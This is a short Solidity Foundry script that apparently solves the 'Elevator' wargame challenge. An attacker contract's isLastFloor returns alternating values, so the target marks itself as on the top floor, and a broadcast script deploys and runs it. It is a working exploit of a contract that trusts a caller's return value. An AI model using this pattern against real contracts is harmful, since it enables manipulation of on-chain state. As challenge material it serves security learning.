//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";


contract ElevatorAttack {
    bool top = true;

    Elevator elevatorInstance = Elevator(0x36ebF4DcD9ca1573Cb119e0014f4A5Ac2b8e5249);

    function isLastFloor(uint256 _floor) external returns (bool) {
      top = !top;
      return top;
    }

    function alwaysTop() external {
      elevatorInstance.goTo(1);
      console.log("Top: ", elevatorInstance.top());
    }
  }


contract ElevatorSolution is Script {

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    ElevatorAttack elevatorAttackInstance = new ElevatorAttack();
    elevatorAttackInstance.alwaysTop();
    vm.stopBroadcast();
  }
}